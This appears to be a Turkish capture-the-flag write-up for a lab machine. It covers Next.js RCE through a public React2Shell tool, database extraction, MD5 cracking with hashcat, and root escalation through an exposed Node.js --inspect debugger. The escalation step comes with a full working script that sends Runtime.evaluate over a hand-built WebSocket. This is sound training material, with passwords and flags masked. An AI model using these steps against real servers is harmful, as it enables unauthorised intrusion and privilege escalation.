@@ -1,0 +1,179 @@
+nmap ile başlıyorum:
+
+    nmap -sC -sV -p- --min-rate 5000 -oA full_scan 10.129.59.123
+
+Açık portlar:
+  - 22/tcp  -> OpenSSH 9.6p1 Ubuntu
+  - 3000/tcp -> Next.js uygulaması
+
+Port 3000'de bir Next.js web uygulaması var. Tarayıcıda açınca
+"REACTORWATCH - CORE MONITORING SYSTEM v3.2.1" adlı bir nükleer reaktör
+izleme dashboard'u karşılıyor. Statik bir sayfa gibi görünüyor, login
+formu yok, sadece metrikler ve personel listesi var.
+
+Next.js versiyonunu response header'lardan öğreniyorum:
+    X-Powered-By: Next.js
+    x-nextjs-prerender: 1
+
+JS kaynaklarını ve gobuster ile dizin taraması yapıyorum ama tek aktif
+route anasayfa. API endpoint'i de yok görünüşte.
+
+
+[ Vulnerability Research ]
+
+Next.js 15.0.3 çalışıyor. Bu versiyonda CVE-2025-55182 var: React Server
+Components (RSC) protokolü üzerinden unauthenticated RCE. Next.js özelinde
+CVE-2025-66478 olarak da geçiyor.
+
+Hazır bir tool var, direkt kullanıyorum:
+    https://github.com/xalgord/React2Shell
+
+    git clone https://github.com/xalgord/React2Shell
+    cd React2Shell
+    python3 react2shell.py -u http://10.129.59.123:3000
+
+RCE alındı, node kullanıcısı olarak komut çalıştırabiliyorum.
+
+
+[ Credential Hunting ]
+
+/opt/reactor-app/ altına bakıyorum:
+
+    ls /opt/reactor-app/
+    -> app, next.config.js, node_modules, package.json, reactor.db
+
+reactor.db dosyası var. SQLite veritabanı, base64 ile çekiyorum:
+
+    base64 /opt/reactor-app/reactor.db
+
+Kali'de decode edip açıyorum:
+
+    echo "BASE64_ÇIKTI" | base64 -d > reactor.db
+    sqlite3 reactor.db "SELECT * FROM users;"
+
+Kullanıcılar:
+
+    engineer | * | operator
+    admin    | * | administrator
+
+MD5 hash'leri. engineer'ın hash'ini hashcat ile kırıyorum:
+
+    echo -n "*" > hash.txt
+    hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
+
+Sonuç: *
+
+admin hash'i kırılamıyor.
+
+
+[ User Flag ]
+
+SSH ile bağlanıyorum:
+
+    ssh engineer@10.129.59.123
+    password: *
+
+    cat user.txt
+    *
+
+
+[ Privilege Escalation ]
+
+Sistemde çalışan processlere bakıyorum:
+
+    ps aux | grep node
+
+İlginç bir satır:
+
+    root 1359 /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
+
+Root olarak çalışan bir Node.js process'i, --inspect flag'i ile başlatılmış.
+Bu flag Chrome DevTools Protocol (CDP) inspector'ı açar. 127.0.0.1:9229'da
+dinliyor yani dışarıdan erişilemiyor ama bizim zaten local erişimimiz var.
+
+Inspector'ın JSON endpoint'ini sorguluyorum:
+
+    curl -s http://127.0.0.1:9229/json
+
+Çıktı:
+
+    [{
+      "id": "086dcfb3-ee5f-4d37-9e72-e509118fd07b",
+      "title": "/opt/uptime-monitor/worker.js",
+      "webSocketDebuggerUrl": "ws://127.0.0.1:9229/086dcfb3-ee5f-4d37-9e72-e509118fd07b"
+    }]
+
+CDP WebSocket üzerinden çalışıyor. Runtime.evaluate komutu ile hedef
+process içinde JavaScript çalıştırabiliriz, process root olduğu için
+kodumuz da root olarak çalışır.
+
+Problem: hedef sistemde ws modülü yok. Çözüm: Node.js built-in modülleri
+olan net ve crypto ile WebSocket protokolünü elle implement ediyorum.
+
+Ayrıca inspector context'inde require() direkt çalışmıyor. Bunun yerine
+process.mainModule.require() kullanmak gerekiyor.
+
+/tmp/exploit.js dosyasını yazıyorum:
+
+---
+const net = require('net');
+const crypto = require('crypto');
+
+const WS_ID = '086dcfb3-ee5f-4d37-9e72-e509118fd07b';
+const key = crypto.randomBytes(16).toString('base64');
+
+const handshake = `GET /${WS_ID} HTTP/1.1\r\nHost: 127.0.0.1:9229\r\n` +
+  `Upgrade: websocket\r\nConnection: Upgrade\r\n` +
+  `Sec-WebSocket-Key: ${key}\r\nSec-WebSocket-Version: 13\r\n\r\n`;
+
+function makeFrame(payload) {
+  const data = Buffer.from(payload);
+  const mask = crypto.randomBytes(4);
+  const masked = Buffer.alloc(data.length);
+  for (let i = 0; i < data.length; i++) masked[i] = data[i] ^ mask[i % 4];
+  let header;
+  if (data.length < 126) {
+    header = Buffer.alloc(6);
+    header[0] = 0x81; header[1] = 0x80 | data.length;
+    mask.copy(header, 2);
+  } else {
+    header = Buffer.alloc(8);
+    header[0] = 0x81; header[1] = 0xfe;
+    header.writeUInt16BE(data.length, 2);
+    mask.copy(header, 4);
+  }
+  return Buffer.concat([header, masked]);
+}
+
+const client = net.createConnection(9229, '127.0.0.1', () => client.write(handshake));
+let upgraded = false, buf = '';
+
+client.on('data', (data) => {
+  if (!upgraded) {
+    buf += data.toString();
+    if (buf.includes('\r\n\r\n')) {
+      upgraded = true;
+      const cmd = JSON.stringify({
+        id: 1,
+        method: 'Runtime.evaluate',
+        params: {
+          expression: "process.mainModule.require('fs').readFileSync('/root/root.txt','utf8')"
+        }
+      });
+      client.write(makeFrame(cmd));
+    }
+  } else {
+    console.log(data.toString());
+    client.destroy();
+  }
+});
+---
+
+Çalıştırıyorum:
+
+    node /tmp/exploit.js
+
+
+[ Root Flag ]
+
+    *
